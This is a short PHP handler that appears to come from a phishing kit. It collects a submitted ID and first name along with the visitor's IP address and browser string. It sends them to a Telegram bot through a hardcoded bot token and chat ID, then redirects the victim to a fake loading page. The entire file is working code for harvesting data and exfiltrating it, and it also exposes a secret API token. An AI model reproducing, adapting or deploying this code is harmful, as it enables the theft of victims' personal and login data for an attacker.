<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "-----------------\n";
$message .= "ID : ".$_POST['1']."\n";
$message .= "F.NAME : ".$_POST['2']."\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "------------------------------------\n";
$token = "8028949273:AAF72nlAu7eyt4CrphEgpO8lm-1ILJPDqNk";
$data = [
    'text' => $message,
    'chat_id' => '1006424024'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

 

header("Location: ../looad.html");?>

<?php